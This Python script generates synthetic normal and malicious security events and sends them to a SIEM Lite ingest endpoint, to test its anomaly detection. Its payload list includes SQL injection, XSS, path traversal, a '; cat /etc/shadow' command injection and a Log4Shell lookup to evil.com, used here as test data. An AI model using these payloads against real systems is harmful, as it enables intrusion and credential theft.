#!/usr/bin/env python3
"""
Example Log Sender - Demonstrates how to send logs to SIEM Lite
This script simulates various security events for testing purposes
"""

import requests
import random
import time
from datetime import datetime
import json

# Configuration
# IMPORTANT: This URL must point to your Vercel deployment's API endpoint.
# It should look like: https://your-app-name.vercel.app/api/ingest
API_ENDPOINT = "https://siem-lite-fppjqtv58-lotas-projects-7907767d.vercel.app/api/ingest"

# Sample data for generating realistic logs
SOURCES = [
    "web_server_prod",
    "api_gateway",
    "auth_service",
    "database_primary",
    "firewall",
    "vpn_gateway",
    "email_server"
]

EVENT_TYPES = [
    "login_success",
    "login_failed",
    "api_request",
    "database_query",
    "firewall_block",
    "file_access",
    "unauthorized_access",
    "rate_limit_exceeded",
    "password_reset",
    "account_locked"
]

SEVERITIES = ["info", "low", "medium", "high", "critical"]

# Malicious patterns for testing anomaly detection
MALICIOUS_PATTERNS = [
    "' OR '1'='1",
    "admin' --",
    "<script>alert('xss')</script>",
    "../../etc/passwd",
    "; cat /etc/shadow",
    "UNION SELECT * FROM users",
    "%00",
    "{{7*7}}",
    "${jndi:ldap://evil.com}",
    "../../../windows/system32"
]

SAMPLE_IPS = [
    "192.168.1.100",
    "10.0.0.50",
    "172.16.0.25",
    "203.0.113.42",  # Suspicious IP
    "198.51.100.88"
]

SAMPLE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "curl/7.68.0",
    "Python-requests/2.28.0",
    "Nikto/2.1.6",  # Security scanner (will be flagged)
    "sqlmap/1.6",   # SQL injection tool (will be flagged)
    "Mozilla/5.0 (compatible; Googlebot/2.1)"
]

def generate_normal_event():
    """Generate a normal security event"""
    return {
        "source": random.choice(SOURCES),
        "severity": random.choice(["info", "low"]),
        "event_type": random.choice(["login_success", "api_request", "database_query"]),
        "message": f"Normal operation: {random.choice(EVENT_TYPES)} completed successfully",
        "source_ip": random.choice(SAMPLE_IPS[:3]),  # Use safe IPs
        "user_agent": SAMPLE_USER_AGENTS[0],
        "username": f"user{random.randint(1, 100)}",
        "metadata": {
            "session_id": f"sess_{random.randint(1000, 9999)}",
            "request_duration_ms": random.randint(10, 500)
        }
    }

def generate_suspicious_event():
    """Generate a suspicious/malicious event"""
    pattern = random.choice(MALICIOUS_PATTERNS)
    
    return {
        "source": random.choice(SOURCES),
        "severity": random.choice(["high", "critical"]),
        "event_type": random.choice(["unauthorized_access", "login_failed", "rate_limit_exceeded"]),
        "message": f"Suspicious activity detected: {pattern}",
        "source_ip": SAMPLE_IPS[3],  # Suspicious IP
        "user_agent": random.choice(SAMPLE_USER_AGENTS[3:5]),  # Scanner user agents
        "username": "admin",
        "metadata": {
            "attack_type": "injection_attempt",
            "payload": pattern
        }
    }

def generate_failed_login_burst(ip, count=7):
    """Generate multiple failed login attempts (brute force simulation)"""
    events = []
    username = f"admin{random.randint(1, 5)}"
    
    for i in range(count):
        events.append({
            "source": "auth_service",
            "severity": "medium",
            "event_type": "login_failed",
            "message": f"Failed login attempt for user {username}",
            "source_ip": ip,
            "user_agent": SAMPLE_USER_AGENTS[0],
            "username": username,
            "metadata": {
                "attempt_number": i + 1,
                "failure_reason": "invalid_password"
            }
        })
    
    return events

def send_event(event):
    """Send an event to the SIEM API"""
    try:
        response = requests.post(
            API_ENDPOINT,
            json=event,
            headers={"Content-Type": "application/json"}
        )
        
        if response.status_code in [200, 201]:
            result = response.json()
            status = "🔴 ANOMALY" if result.get('analysis', {}).get('is_anomaly') else "🟢 NORMAL"
            print(f"{status} | {event['severity'].upper():8} | {event['event_type']:20} | Score: {result.get('analysis', {}).get('anomaly_score', 0):.2f}")
            return result
        elif response.status_code == 401 and "Vercel" in response.text:
            print("❌ Error: Vercel Deployment Protection is enabled. Go to Vercel Settings > Deployment Protection and disable 'Vercel Authentication'.")
            return None
        elif response.status_code == 405:
            print(f"❌ Error: 405 Method Not Allowed. You are likely posting to the wrong URL.")
            print(f"   - Current Endpoint: {API_ENDPOINT}")
            print("   - Ensure it ends with /api/ingest")
            return None
        else:
            print(f"❌ Error sending event: {response.status_code} - {response.text[:100]}...")
            return None
            
    except Exception as e:
        print(f"❌ Exception: {str(e)}")
        return None

def main():
    """Main function to generate and send test events"""
    print("=" * 80)
    print("SIEM LITE - TEST EVENT GENERATOR")
    print("=" * 80)
    print(f"Sending events to: {API_ENDPOINT}")
    print()
    
    mode = input("Select mode:\n1. Continuous stream\n2. Single event\n3. Brute force simulation\n4. Mixed scenario\nChoice (1-4): ")
    
    if mode == "1":
        # Continuous stream
        print("\n🚀 Starting continuous event stream (Ctrl+C to stop)...\n")
        try:
            while True:
                # 70% normal, 30% suspicious
                if random.random() < 0.7:
                    event = generate_normal_event()
                else:
                    event = generate_suspicious_event()
                
                send_event(event)
                time.sleep(random.uniform(0.5, 2.0))
                
        except KeyboardInterrupt:
            print("\n\n✅ Stream stopped")
    
    elif mode == "2":
        # Single event
        event_type = input("\nEvent type (1=Normal, 2=Suspicious): ")
        if event_type == "1":
            event = generate_normal_event()
        else:
            event = generate_suspicious_event()
        
        print("\n📤 Sending event...")
        send_event(event)
    
    elif mode == "3":
        # Brute force simulation
        print("\n🔨 Simulating brute force attack...")
        suspicious_ip = "203.0.113.42"
        events = generate_failed_login_burst(suspicious_ip, count=10)
        
        for event in events:
            send_event(event)
            time.sleep(0.5)
        
        print("\n✅ Brute force simulation complete")
    
    elif mode == "4":
        # Mixed scenario
        print("\n🎭 Running mixed scenario...\n")
        
        # Send some normal events
        print("Phase 1: Normal traffic")
        for _ in range(5):
            send_event(generate_normal_event())
            time.sleep(0.5)
        
        # Brute force attack
        print("\nPhase 2: Brute force attack")
        for event in generate_failed_login_burst("203.0.113.42", count=7):
            send_event(event)
            time.sleep(0.3)
        
        # SQL injection attempts
        print("\nPhase 3: SQL injection attempts")
        for _ in range(3):
            send_event(generate_suspicious_event())
            time.sleep(0.5)
        
        # Return to normal
        print("\nPhase 4: Return to normal")
        for _ in range(5):
            send_event(generate_normal_event())
            time.sleep(0.5)
        
        print("\n✅ Mixed scenario complete")
    
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()